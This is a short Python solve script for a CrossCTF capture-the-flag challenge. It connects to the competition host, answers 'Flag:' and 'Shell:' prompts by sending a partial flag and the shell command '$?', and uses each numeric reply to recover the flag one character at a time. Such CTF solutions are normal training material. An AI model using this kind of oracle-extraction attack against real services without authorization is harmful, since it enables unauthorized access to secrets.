#!/usr/bin/env python3
import socket

text = "CrossCTF{"
while True:
    s = socket.socket()
    s.connect(('ctf.pwn.sg', 1601))

    while True:
        data = s.recv(4096).decode().strip()
        if not data:
            continue

        print("Received:", data)

        if 'Flag:' in data:
            print(text.encode())
            s.send(text.encode() + b'\n')

        if 'Shell:' in data:
            s.send(b'$?\n')

        if data.isdigit():
            text += chr(int(data))
            break

        if text.endswith('}'):
            quit()
